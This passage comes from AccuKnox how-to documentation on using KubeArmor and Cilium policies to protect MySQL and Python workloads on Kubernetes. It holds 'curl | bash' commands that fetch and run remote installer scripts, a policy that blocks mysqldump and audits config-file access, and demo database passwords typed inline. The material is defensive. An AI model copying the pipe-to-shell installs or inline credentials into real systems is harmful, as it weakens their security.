https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/system/ksp-block-stigs-mysql-config-directory-access.yaml\nkubearmorpolicy.security.kubearmor.com/ksp-block-stigs-mysql-config-directory-access unchanged\n\u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/stigs/network/cnp-mysql-stig-v-235146.yaml\nciliumnetworkpolicy.cilium.io/cnp-mysql-stig-v-235146 unchanged\n\u276f kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/mitre/network/cnp-egress-deny-external-communication-from-mysql-pod.yaml\nciliumnetworkpolicy.cilium.io/cnp-egress-deny-external-communication-from-mysql-pod unchanged\n</code></pre> <p>Deployment state after applied the policies:</p> <pre><code>\u276f kubectl get all -A | grep sql\ndefault       pod/wordpress-mysql-55556f7-nf5fm              1/1     Running    0            32m\nexplorer      pod/mysql-0                                    1/1     Running    0            17m\ndefault       service/mysql                                          ClusterIP  None         &lt;none&gt;          3306/TCP       5h23m\ndefault       service/wordpress-mysql                                ClusterIP  None         &lt;none&gt;          3306/TCP       32m\nexplorer      service/mysql                                          ClusterIP  10.52.4.111  &lt;none&gt;          3306/TCP       17m\nexplorer      service/mysql-headless                                 ClusterIP  None         &lt;none&gt;          3306/TCP       17m\ndefault       deployment.apps/wordpress-mysql                 1/1     1         1             32m\ndefault       replicaset.apps/wordpress-mysql-55556f7                 1         1             32m\ndefault       replicaset.apps/wordpress-mysql-7fc5cb7ccc              0         0             32m\nexplorer      statefulset.apps/mysql                          1/1                             17m\n</code></pre> <p>Verifying logs using Cilium:</p> <p>List all cilium pods</p> <pre><code>\u276f kubectl -n kube-system get pods -l k8s-app=cilium\nNAME           READY   STATUS    RESTARTS   AGE\ncilium-6jbcf   1/1     Running   0          115m\ncilium-pj86d   1/1     Running   0          115m\ncilium-qp649   1/1     Running   0          115m\n</code></pre> <p>Run this command</p> <pre><code>kubectl -n kube-system exec -it cilium-6jbcf -- bash\n</code></pre> <p>[Note: Pods name may vary check with your deployment]</p> <p>After entering into the pod, Run this below command:</p> <pre><code>\u276f kubectl -n kube-system exec -it cilium-6jbcf -- bash\nDefaulted container \"cilium-agent\" out of: cilium-agent, wait-for-node-init (init), ebpf-mount (init), clean-cilium-state (init)\nroot@gke-cys-may-9-default-pool-8ddae69c-gnkg:/home/cilium# cilium monitor\nListening for events on 2 CPUs with 64x4096 of shared memory\nPress Ctrl-C to quit\nlevel=info msg=\"Initializing dissection cache...\" subsys=monitor\n-&gt; endpoint 1 flow 0x0 identity remote-node-&gt;health state new ifindex 0 orig-ip 10.128.15.192: 10.128.15.192 -&gt; 10.40.2.23 EchoRequest\n-&gt; stack flow 0x0 identity health-&gt;remote-node state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23 -&gt; 10.128.15.192 EchoReply\n-&gt; endpoint 1 flow 0x0 identity remote-node-&gt;health state established ifindex 0 orig-ip 10.128.15.192: 10.128.15.192:58714 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; stack flow 0x1e62a16c identity health-&gt;remote-node state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.15.192:58714 tcp ACK\n-&gt; stack flow 0xd663c7fb identity health-&gt;remote-node state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.0.63:34796 tcp ACK\n-&gt; endpoint 1 flow 0x0 identity remote-node-&gt;health state established ifindex 0 orig-ip 10.128.0.63: 10.128.0.63:34796 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; stack flow 0x44777c79 identity health-&gt;host state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.0.62:36604 tcp ACK\n-&gt; endpoint 1 flow 0xf6e1704e identity host-&gt;health state established ifindex 0 orig-ip 10.128.0.62: 10.128.0.62:36604 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; stack flow 0x1e62a16c identity health-&gt;remote-node state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.15.192:58714 tcp ACK\n-&gt; endpoint 1 flow 0x0 identity remote-node-&gt;health state established ifindex 0 orig-ip 10.128.15.192: 10.128.15.192:58714 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; endpoint 1 flow 0x0 identity remote-node-&gt;health state established ifindex 0 orig-ip 10.128.0.63: 10.128.0.63:34796 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; stack flow 0xd663c7fb identity health-&gt;remote-node state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.0.63:34796 tcp ACK\n-&gt; endpoint 1 flow 0xf6e1704e identity host-&gt;health state established ifindex 0 orig-ip 10.128.0.62: 10.128.0.62:36604 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; stack flow 0x44777c79 identity health-&gt;host state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.0.62:36604 tcp ACK\n-&gt; endpoint 1 flow 0x0 identity remote-node-&gt;health state established ifindex 0 orig-ip 10.128.15.192: 10.128.15.192:58714 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; stack flow 0x1e62a16c identity health-&gt;remote-node state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.15.192:58714 tcp ACK\n-&gt; stack flow 0xd663c7fb identity health-&gt;remote-node state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.0.63:34796 tcp ACK\n-&gt; endpoint 1 flow 0x0 identity remote-node-&gt;health state established ifindex 0 orig-ip 10.128.0.63: 10.128.0.63:34796 -&gt; 10.40.2.23:4240 tcp ACK\n-&gt; stack flow 0x44777c79 identity health-&gt;host state reply ifindex 0 orig-ip 0.0.0.0: 10.40.2.23:4240 -&gt; 10.128.0.62:36604 tcp ACK\n-&gt; endpoint 1 flow 0xf6e1704e identity host-&gt;health state established ifindex 0 orig-ip 10.128.0.62: 10.128.0.62:36604 -&gt; 10.40.2.23:4240 tcp ACK\n&gt;&gt; IPCache entry upserted: {\"cidr\":\"10.128.0.62/32\",\"id\":1,\"old-id\":1,\"encrypt-key\":0}\n&gt;&gt; IPCache entry upserted: {\"cidr\":\"10.40.2.1/32\",\"id\":1,\"old-id\":1,\"encrypt-key\":0}\n&gt;&gt; IPCache entry upserted: {\"cidr\":\"10.40.2.1/32\",\"id\":1,\"old-id\":1,\"encrypt-key\":0}\n&gt;&gt; IPCache entry upserted: {\"cidr\":\"10.40.2.1/32\",\"id\":1,\"old-id\":1,\"encrypt-key\":0}\n&gt;&gt; IPCache entry upserted: {\"cidr\":\"10.40.2.40/32\",\"id\":1,\"old-id\":1,\"encrypt-key\":0}\n</code></pre>"},{"location":"how-to/ensure-policies-will-not-break-application/#conclusion","title":"Conclusion","text":"<p>In this document, we tested and proven several KubeArmor and cilium rules in our OnlineBookStore (mysql) implementation. In this section, we introduced rules such as <code>readOnly: true</code> and <code>ownerOnly: true</code> to allow certain functionality while blocking unauthorized access and processing for KubeArmor policies. Cilium is a white-list model. As a result, we restrict access to our programme to specific ports and access points. We can safeguard workloads and operate workloads smoothly in our environment with these two accuknox open-source solutions. \\</p> <p>We used KubeArmor Policy-Templates and AccuKnox Sample Library to deploy applications and apply policies to our workload.</p>"},{"location":"how-to/protect-mysql-application/","title":"How to protect MySQL application with AccuKnox","text":"<p>Database Management is an important part when you have a large amount of data around you. MySQL is one of the most famous open-source Relational Databases to store and handle your data. So securing the data is the main concern for any organization.</p> <p></p> <p>AccuKnox  provides runtime cloud security for your applications. In this cookbook, we will demonstrate how MySQL applications can be protected.</p>"},{"location":"how-to/protect-mysql-application/#prerequisites","title":"Prerequisites","text":"<p>Install open-source AccuKnox tools to your cloud environment.</p> <p>Run the following script to install Daemon sets and Services</p> <pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash </code></pre> <p>For more details, check this  help page or Use the enterprise tier of the  AccuKnox product</p>"},{"location":"how-to/protect-mysql-application/#deploy-sample-phpmysql-web-application-in-kubernetes","title":"Deploy Sample PHP/MySQL Web application in Kubernetes","text":"<p>We will create two deployments; one for the webserver and the other for MySQL DB. The web server will read data from MySQL DB and show it in the browser.</p> <p>Here we have used the GKE environment.</p> <p>[Step 1]  Clone GitHub Repo</p> <pre><code>git clone https://github.com/accuknox/samples.git\ncd samples/php-mysql-webapp\n</code></pre> <p>[Step 2] Deploy Web server</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver.yaml\n</code></pre> <p>Run <code>kubectl get pods</code> in the terminal to get the response:</p> <p>You should be able to see the output like this:</p> <pre><code>NAME                         READY   STATUS    RESTARTS   AGE\nwebserver-55f99f9ffb-f4rvk   1/1     Running   0          2d3h\n</code></pre> <p>Alright, the pod is created but we can\u2019t access it despite having its IP, the reason is that the Pod IP is not public. So we use  service. When a user tries to access an app, for instance, a web server here, it actually makes a request to a service which itself then checks where it should forward the request. Now to access the webserver you will just access the IP and port as defined in the service configuration file.</p> <p>[Step 3] Now let's deploy web-service</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/webserver-svc.yaml\n</code></pre> <p>Check the status of the service</p> <pre><code>kubectl get svc\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>NAME             TYPE           CLUSTER-IP     EXTERNAL-IP      PORT(S)        AGE\nkubernetes       ClusterIP      10.16.0.1      &lt;none&gt;           443/TCP        27d\nweb-service      LoadBalancer   10.16.9.151    35.193.121.214   80:31533/TCP   2d3h\n</code></pre> <p>[Step 4] Create the persistent volume claim to keep your data intact.</p> <p>[Step 5] Create deployment and service for MySQL DB.</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/php-mysql-webapp/mysql.yaml    </code></pre> <p>Check the status of the pod and service</p> <pre><code>kubectl get po,svc  </code></pre> <p>You should be able to see the output like this</p> <pre><code>NAME                             READY   STATUS    RESTARTS   AGE\npod/mysql-796674bfb-dl495        1/1     Running   0          115s\npod/webserver-5f7dbd89d6-5ng7r   1/1     Running   0          19m\npod/webserver-5f7dbd89d6-hnrz9   1/1     Running   0          19m\npod/webserver-5f7dbd89d6-pmw4s   1/1     Running   0          19m\n\nNAME                     TYPE           CLUSTER-IP   EXTERNAL-IP    PORT(S)        AGE\nservice/kubernetes       ClusterIP      10.8.0.1     &lt;none&gt;         443/TCP        32m\nservice/mysql8-service   ClusterIP      10.8.1.249   &lt;none&gt;         3306/TCP       27s\nservice/web-service      LoadBalancer   10.8.0.92    34.70.234.72   80:32209/TCP   14m\n</code></pre> <p>Now the application is deployed. You can insert data into the database in two ways. You can use a MySQL Client or directly execute to the MySQL server pod.</p> <p>Connect using a MySQL client:</p> <pre><code>kubectl run -it --rm --image=mysql:5.6 --restart=Never mysql-client -- mysql -h mysql8-service -p.sweetpwd.\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>$ kubectl run -it --rm --image=mysql:5.6 --restart=Never mysql-client -- mysql -h mysql8-service -p.sweetpwd.\nIf you don't see a command prompt, try pressing enter.\n\nmysql&gt;\n</code></pre> <p>Directly executing into MySQL pod:</p> <pre><code>kubectl exec -it mysql-796674bfb-dl495 -- bash\n</code></pre> <p>Note: Replace mysql-796674bfb-dl495 with your mysql pod name.</p> <p>Now you are inside MySQL pod. Use the below command to enter the MySQL command prompt.</p> <pre><code>mysql -u root -p.sweetpwd.\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>$ kubectl exec -it mysql-69559dfd5d-nzmcd -- bash\nroot@mysql-69559dfd5d-nzmcd:/# mysql -u root -p.sweetpwd.\nmysql: [Warning] Using a password on the command line interface can be insecure.\nWelcome to the MySQL monitor.  Commands end with ; or \\g.\nYour MySQL connection id is 10\nServer version: 8.0.28 MySQL Community Server - GPL\n\nCopyright (c) 2000, 2022, Oracle and/or its affiliates.\n\nOracle is a registered trademark of Oracle Corporation and/or its\naffiliates. Other names may be trademarks of their respective\nowners.\n\nType 'help;' or '\\h' for help. Type '\\c' to clear the current input statement.\n\nmysql&gt; </code></pre> <p>Now you are inside the MySQL terminal. First, you need to create a users table and add values to the table.</p> <p>Use the below commands to do that.</p> <pre><code>SHOW DATABASES;\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>USE my_db;\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>CREATE TABLE users\n(\nname varchar(20)\n);\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>INSERT INTO users (name)\nVALUES ('John');\n</code></pre> <p>Now check the external IP of the web service. If everything works well, you'll see this screen with the name John.</p>"},{"location":"how-to/protect-mysql-application/#working-with-open-source-accuknox-tools","title":"Working with Open-Source AccuKnox tools","text":"<p>The policy-templates open-source repository provides policy templates based on KubeArmor and Cilium policies for known CVEs and attacks vectors, compliance frameworks such as PCI-DSS, MITRE, STIG, NIST, CIS, etc., popular workloads such as GoLang, Python, PostgreSQL, Cassandra, MySQL, WordPress, etc.</p> <p>We hope that you also contribute by sending policy templates via pull requests or Github issues to grow the list.</p> <p>Go to GitHub repository:  https://github.com/kubearmor/policy-templates</p> <p>AccuKnox provides a number of policy templates for your MySQL workloads.</p> <p>Let's see a policy from the policy templates repo.</p>"},{"location":"how-to/protect-mysql-application/#audit-your-mysql-server-sensitive-configuration-files-with-kubearmor","title":"Audit your MySQL Server Sensitive Configuration files with KubeArmor","text":"<p>MySQL Server, also known as mysqld, is a single multithreaded program that does most of the work in a MySQL installation. It does not spawn additional processes. MySQL Server manages access to the MySQL data directory that contains databases and tables. The data directory is also the default location for other information such as log files and status files.</p>"},{"location":"how-to/protect-mysql-application/#i-mycnf","title":"(i) my.cnf:","text":"<p>The default configuration file is called  my.cnf  and can be located in a number of directories. On Linux and other Unix related platforms, the locations are using  /etc/my.cnf, /etc/mysql/my.cnf, /var/lib/mysql/my.cnf or in the default installation directory. This file contains configuration settings that will be loaded when the server starts, including settings for the clients, server, mysqld_safe wrapper and various other MySQL client programs.</p> <p>However, if they're not there, you can use mysqld to find the configuration. Run the following command inside the MySQL server pod.</p> <pre><code>mysqld --help --verbose\n</code></pre> <p>The first part of the lengthy response describes the options you can send to the server when you launch it. The second part displays the configuration settings during the server compilation.</p> <p>Near the start of the output, find a couple of lines that look similar to the following example:</p> <pre><code>Starts the MySQL database server.\n\nUsage: mysqld [OPTIONS]\n\nDefault options are read from the following files in the given order:\n/etc/my.cnf /etc/mysql/my.cnf ~/.my.cnf The following groups are read: mysqld server mysqld-8.0\n</code></pre>"},{"location":"how-to/protect-mysql-application/#ii-my-newcnf","title":"(ii) my-new.cnf","text":"<p>This file is created when there is an existing my.cnf file and the  mysql_install_db  script is running. The mysql_install_db script is designed to develop the my.cnf file if it does not exist. If the file does exist, then the file is created using the name my-new.cnf to avoid overwriting an existing configuration file. It is then up to the user to compare the two, determine files and determine which options are still valid, for the new install and change the files as required to get the new my.cnf configuration file.</p>"},{"location":"how-to/protect-mysql-application/#iii-log-files","title":"(iii) Log files","text":"<p>By default, MySQL stores its log files in the following directory:</p> <pre><code>/var/log/mysql\n</code></pre> <p>Check the MySQL configuration if you don't find the MySQL logs in the default directory. View the  my.cnf  file and look for a log_error line, as in:</p> <pre><code>log_error = /var/log/mysql/error.log\n</code></pre>"},{"location":"how-to/protect-mysql-application/#iv-backups","title":"(iv) Backups","text":"<p>The two main options are to copy the database files or use  mysqldump as follows:</p>"},{"location":"how-to/protect-mysql-application/#file-copy","title":"File copy","text":"<p>By default, MySQL creates a directory for each database in its data directory,  /var/lib/mysql.</p> <p>Note: Ensure you set the permissions on that file to restrict read access for password-security reasons.</p>"},{"location":"how-to/protect-mysql-application/#mysqldump","title":"mysqldump","text":"<p>Another approach to backing up your database is to use the mysqldump tool. Rather than copying the database files directly, mysqldump generates a text file that represents the database. By default, the text file contains a list of SQL statements to recreate the database, but you can also export the database in another format like  .CSV  or  .XML. You can read the man page for mysqldump to see all its options.</p> <p>The statements generated by mysqldump go straight to standard output. You can specify a to redirect the output by running the following command in the command line:</p> <p>This command tells mysqldump to recreate the  demodb  database in SQL statements and to write them to the file  dbbackup.sql. Note that the username and password options function the same as the MySQL client to include the password directly after -p in a script.</p> <p>With the help of  KubeArmor  and Policy-templates, You can audit/restrict all these sensitive configuration files and processes that use these files easily.</p>"},{"location":"how-to/protect-mysql-application/#following-kubearmor-policy-will-audit-configuration-files-and-block-mysqldump-command","title":"Following KubeArmor policy will Audit configuration files and block mysqldump command.","text":"<pre><code># KubeArmor is an open source software that enables you to protect your cloud workload at runtime.\n# To learn more about KubeArmor visit: \n# https://www.accuknox.com/kubearmor/ \n\napiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\nname: ksp-restrict-access-mysql-server-config\nnamespace: default # Change your namespace\nspec:\ntags: [\"MYSQL\", \"config-files\", \"mysqldump\"]\nmessage: \"Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\"\nselector:\nmatchLabels:\napp: mysql8 # Change your labels\nfile:\nseverity: 5\nmatchPaths:\n- path: /etc/mysql/my.cnf\nownerOnly: true\nmatchDirectories:\n- dir: /etc/mysql/\nrecursive: true\nownerOnly: true\n- dir: /var/lib/mysql/\nreadOnly: true\nrecursive: true\n- dir: /var/log/mysql/\nrecursive: true\naction: Audit\nprocess:\nseverity: 10\nmatchPaths:\n- path: /usr/bin/mysqldump\naction: Block </code></pre> <p>Apply KubeArmor Security Policy (KSP) from the  Policy templates  and perform following steps:</p> <ol> <li>Go to Policy templates GitHub Repository.</li> <li>Check MySQL folder then copy the URL of the policy raw file.</li> <li>Apply it using kubectl apply command.</li> </ol> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/MySQL/system/ksp-restrict-access-mysql-server-config-files.yaml\n</code></pre> <ol> <li>Use mysqldump command:</li> </ol> <pre><code>kubectl exec -it mysql-69559dfd5d-nzmcd -- bash\nroot@mysql-7d9977c67d-57mrx:/# mysqldump -u db_user -p .mypwd my_db users &gt; dumpfilename.sql\n</code></pre> <p>Note: Replace mysql-69559dfd5d-nzmcd with your mysql pod name.</p> <ol> <li>You should be able to see the output like this</li> </ol> <pre><code>root@mysql-69559dfd5d-nzmcd:/# mysqldump -u db_user -p .mypwd my_db users &gt; dumpfilename.sql\nbash: /usr/bin/mysqldump: Permission denied\nroot@mysql-69559dfd5d-nzmcd:/# </code></pre>"},{"location":"how-to/protect-mysql-application/#view-kubearmor-logs","title":"View KubeArmor logs:","text":"<p>a. Enable port-forwarding for KubeArmor relay</p> <pre><code>kubectl port-forward -n kube-system svc/kubearmor 32767:32767\n</code></pre> <p>b. Observing logs using karmor CLI</p> <pre><code>karmor log\n</code></pre> <p>You should be able to see the output like this</p> <pre><code>gRPC server: localhost:32767\nCreated a gRPC client (localhost:32767)\nChecked the liveness of the gRPC server\nStarted to watch alerts\n== Alert / 2022-02-08 03:10:05.867619 ==\nCluster Name: default\nHost Name: gke-cys-feb8-default-pool-4852bc33-rmcr\nNamespace Name: default\nPod Name: mysql-69559dfd5d-nzmcd\nContainer ID: 4dd61ec15b1f8075b8ac9ebe2aeed413c01e57af7d4e9bec7cff82b65f761677\nContainer Name: mysql\nSeverity: ksp-restrict-access-mysql-server-config\nTags: 10\nMessage: MYSQL,config-files,mysqldump\nType: Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\nSource: MatchedPolicy\nOperation: /bin/bash\nResource: Process\nData: /usr/bin/mysqldump -u db_user -p .mypwd my_db users\nAction: syscall=SYS_EXECVE\nResult: Block\n</code></pre> <p>Accessing /etc/mysql/my.cnf config. file;</p> <pre><code>root@mysql-7d9977c67d-7rcmb:/# cat /etc/mysql/my.cnf </code></pre> <p>KubeArmor detects this event and you will receive logs like this: Check karmor log</p> <pre><code>== Alert / 2022-02-08 03:12:40.413064 ==\nCluster Name: default\nHost Name: gke-cys-feb8-default-pool-4852bc33-rmcr\nNamespace Name: default\nPod Name: mysql-69559dfd5d-nzmcd\nContainer ID: 4dd61ec15b1f8075b8ac9ebe2aeed413c01e57af7d4e9bec7cff82b65f761677\nContainer Name: mysql\nSeverity: ksp-restrict-access-mysql-server-config\nTags: 5\nMessage: MYSQL,config-files,mysqldump\nType: Alert! mysql configuration files has been accessed and/or mysqldump command is has been used.\nSource: MatchedPolicy\nOperation: /bin/cat /etc/mysql/my.cnf\nResource: File\nData: /etc/mysql/my.cnf\nAction: syscall=SYS_OPENAT fd=-100 flags=/etc/mysql/my.cnf\nResult: Audit\n</code></pre> <p>Securing configuration files are a necessity for any application. With KubeArmor you can effectively do that and with the options like readOnly , ownerOnly , recursive, matchDirectoriesetc you can fine-tune the policy enforcement. See more KubeArmor Policy Specification</p>"},{"location":"how-to/protect-mysql-application/#protect-using-auto-discovered-policies","title":"Protect Using Auto Discovered Policies","text":"<p>AccuKnox policy auto-discovery engine leverages the pod visibility provided by KubeArmor and Cilium to auto-generate network and system policies.</p> <p>Select Policy Manager -&gt; Auto Discovered Policies</p> <p>We deployed our sample application on the default namespace. Check default namespace for policies</p> <p></p> <p>Following are the auto-discovered policies generated by  AccuKnox. Let's briefly explain the policies.</p> <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\nname: autopol-ingress-anvyjxzgmiqcyws\nspec:\ndescription: Auto Discovered Policy\nendpointSelector:\nmatchLabels:\napp: mysql8\ningress:\n- fromEndpoints:\n- matchLabels:\napp: apache\nk8s:io.kubernetes.pod.namespace: default\ntoPorts:\n- ports:\n- port: \"3306\"\nprotocol: TCP\n</code></pre> <p>This policy will be enforced at the ingress (against the inbound network flows) of the MySQL pod (pods labeled with app: mysql8 will be picked).</p> <p>This enables endpoints with the label app: apache and k8s:io.kubernetes.pod.namespace: default to communicate with all endpoints with the label app: mysql8, but they must share using TCP on port 3306.</p> <p>Endpoints with other labels will not communicate with the MySQL pod.</p> <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\nname: autopol-egress-nqfbfchvptougbs\nspec:\ndescription: Auto Discovered Policy\nendpointSelector:\nmatchLabels:\napp: apache\negress:\n- toEndpoints:\n- matchLabels:\napp: mysql8\nk8s:io.kubernetes.pod.namespace: default\ntoPorts:\n- ports:\n- port: \"3306\"\nprotocol: TCP\n</code></pre> <p>This policy is very similar to the first policy. This will be enforced at the webserver pod's egress (against the outbound network flows) (pods labelled with the app: apache will be picked).</p> <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\nname: autopol-egress-xkvuxpmcxgtpacv\nspec:\ndescription: Auto Discovered Policy\nendpointSelector:\nmatchLabels:\napp: apache\negress:\n- toEndpoints:\n- matchLabels:\nk8s-app: kube-dns\nk8s:io.kubernetes.pod.namespace: kube-system\ntoPorts:\n- ports:\n- port: \"53\"\nprotocol: UDP\n</code></pre> <p>This one is the DNS policy for the webserver pod.</p> <p>All these policies are generated based on the network flow of the sample application.</p> <p>It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and reduce the application's attack surface.</p>"},{"location":"how-to/protect-mysql-application/#conclusion","title":"Conclusion","text":"<p>Auto-discovered policies are generated based on the network flow of the application.</p> <p>It is allowing only minimum traffic that the application needed to operate. This will restrict all unwanted connections and provide runtime security. You can also handcraft your own security policies to secure your MySQL cluster.  </p> <p>KubeArmor Slack:  Join the KubeArmor community on Slack!</p> <p>Now you can protect your workloads in minutes using  AccuKnox, it is available to protect your Kubernetes and other cloud workloads using Kernel Native Primitives such as AppArmor, SELinux, and eBPF.</p> <p>Let us know  if you are seeking additional guidance in planning your cloud security program.</p>"},{"location":"how-to/protect-python-microservice/","title":"How to Protect Python micro-services using AccuKnox?","text":""},{"location":"how-to/protect-python-microservice/#introduction","title":"Introduction","text":"<p>Today's complex systems are highly distributed. Since components communicate with each other and share information (such as shifting data between services, storing information, etc.), the native binary format is not ideal. We use serialization to transform this binary data into a string (ASCII characters) so that it can be moved using standard protocols.</p> <p>Serialization operations are extremely frequent in architectures that include APIs, microservices, and client-side MVC. When the data under serialization and deserialization are reliable (under the control of the system), there is no risk.</p> <p>Oftentimes, developers tend to import third-party libraries that are relatively easy to use. Doing so, they unknowingly introduce vulnerabilities through these shared third-party libraries and modules. In this blog, we're going to have a closer look at Insecure Deserialization.</p> <p>Insecure deserialization is a type of vulnerability that occurs when an attacker is able to manipulate the serialized object and result in unintended consequences in the program's flow. This may lead to a DoS, authentication bypass, or even an RCE.</p> <p>Let's take a look at a python microservice with some insecure modules. We will also discuss how to protect (at runtime) against such vulnerabilities using  AccuKnox.  </p>"},{"location":"how-to/protect-python-microservice/#setting-up-a-python-microservice-to-demonstrate-runtime-security","title":"Setting up a Python microservice to demonstrate runtime security","text":"<p>In this blog, we will demonstrate how to protect your Python microservices against such threats by implementing runtime security tools from AccuKnox. These will analyze the application and generate policies that can be enforced by Linux Security Modules (LSMs) like AppArmor and SELinux.</p> <p>Let's create a microservice for online file uploads. We will define an API for them and write the Python code which implements them in the form of microservices.</p> <p>To keep things manageable, we\u2019ll define only two microservices:</p> <ol> <li> <p>Pickle-app \u2013 the main program which takes in the uploaded files as input and stores them in a MySQL database.</p> </li> <li> <p>MySQL \u2013 the storage part for pickle-app</p> </li> </ol> <p></p> <p>You can see that the user will interact with the pickle-app microservice via their browser, and the pickle-app microservice will interact with the MySQL microservice.</p>"},{"location":"how-to/protect-python-microservice/#the-scenarios-purpose-is-to-demonstrate-how-accuknox-opensource-tools-can-be-used-to-implement-zero-trust-in-an-environment","title":"The scenario's purpose is to demonstrate how AccuKnox opensource tools can be used to implement zero trust in an environment.","text":"<p>Let's create a Kubernetes cluster</p> <pre><code>gcloud container clusters create sample-cluster --zone us-central1-c\n</code></pre> <p>Once the cluster is up and running we will deploy the application on a Kubernetes cluster and onboard the cluster to  AccuKnox.</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/python-flask/k8s.yaml\n</code></pre> <p>We\u2019ll also get the external IP for the python flask application using the following command:</p> <pre><code>kubectl get svc\n\nNAME         TYPE           CLUSTER-IP   EXTERNAL-IP     PORT(S)   AGE\nkubernetes   ClusterIP      10.16.0.1    &lt;none&gt;          443/TCP   9h\npickle-svc   LoadBalancer   10.16.0.23   34.123.162.173  80/TCP    9h\n</code></pre> <p>For detailed steps on how to onboard your cluster kindly go through our  help section.</p> <p>The full code for the microservice can be found on this  GitHub repo</p>"},{"location":"how-to/protect-python-microservice/#runtime-protection-using-accuknox-open-source-tools","title":"Runtime protection using AccuKnox Open-source tools","text":"<p>AccuKnox enables the ability to protect your workloads at runtime. AccuKnox enables this by allowing you to configure policies (or auto-discover them) for application and network behavior using KubeArmor, Cilium, and Auto Policy Discovery tools</p> <p>KubeArmor</p> <p>KubeArmor, an open-source software that enables you to protect your cloud workload at runtime.</p> <p>The problem that KubeArmor solves is that it can prevent cloud workloads from executing malicious activity at runtime. Malicious activity can be any activity that the workload was not designed for or is not supposed to do.</p> <p>Cilium</p> <p>Cilium, an open-source project to provide eBPF-based networking, security, and observability for cloud-native environments such as Kubernetes clusters and other container orchestration platforms.</p>"},{"location":"how-to/protect-python-microservice/#auto-policy-discovery-for-your-python-microservice","title":"Auto Policy Discovery for your Python microservice","text":"<p>Even though writing KubeArmor and Cilium (System and Network) policies are not a big challenge AccuKnox opensource has it simplified one step further by introducing a new CLI tool for Auto Discovered Policies. The Auto-Discovery module helps users by identifying the flow and generating policies based on it.</p> <p>Discovering policies has never been better with Auto Discovery. In two simple commands, you can set up and generate policies without having any trouble.</p> <p>We will use AccuKnox Auto Discovered Policies to generate zero-trust runtime security policies to secure our workload.</p> <p>The auto-discovered zero trust runtime security policies can be generated using two commands. We will have to deploy Cilium and KubeArmor to the cluster and use a MySQL pod to store the discovered policies from where they can be downloaded with a single command.</p> <p>First, we will use the below command to install all prerequisites.</p> <p><pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/install.sh | bash`\n</code></pre> Once the command is run successfully it will install the following components to your cluster:</p> <ul> <li> <p>KubeArmor protection engine</p> </li> <li> <p>Cilium CNI</p> </li> <li> <p>Auto policy discovery engine</p> </li> <li> <p>MySQL database to keep discovered policies</p> </li> <li> <p>Hubble Relay and KubeArmor Relay</p> </li> </ul> <p>Once this is down we can invoke the second script file which will download the auto-discovered policies from the MySQL database and store them locally. For this we will issue the below command:</p> <pre><code>curl -s https://raw.githubusercontent.com/accuknox/tools/main/get_discovered_yamls.sh | bash`\n</code></pre> <p>You should be able to see the following output.</p> <pre><code>Got 1 cilium policies in file cilium_policies.yaml \nGot 1 kubearmor policies in file kubearmor_policies_default_explorer_knoxautopolicy_fxbpvndp.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_explorer_mysql_xaqsryye.yaml\nGot 1 kubearmor policies in file kubearmor_policies_default_python-ms_pickle-app_engncdqs.yaml`\n</code></pre> <p>In mere seconds after installing executing auto policy discovery tool, it generated 1 Cilium policy and 3 curated KubeArmor policies.</p> <p>Let us take a look at some of the autodiscovery policies</p> <p>Cilium Policy <pre><code>apiVersion: cilium.io/v2\nkind: CiliumNetworkPolicy\nmetadata:\n  name: autopol-egress-fdjkltpvf\n  namespace: default\nspec:\n  endpointSelector:\n    matchLabels:\n      app: pickle-app\n  ingress:\n  - fromEndpoints:\n    toPorts:\n    - ports:\n      - port: \"80\"\n        protocol: TCP\n</code></pre></p> <p>KubeArmor Policy</p> <pre><code>apiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: autopol-system-269415943\n  namespace: default\nspec:\n  severity: 1\n  selector:\n    matchLabels:\n      app: pickle-app\n  file:\n    matchPaths:\n    - path: /app/templates/index.html\n      fromSource:\n      - path: /usr/bin/python3.8\n    - path: 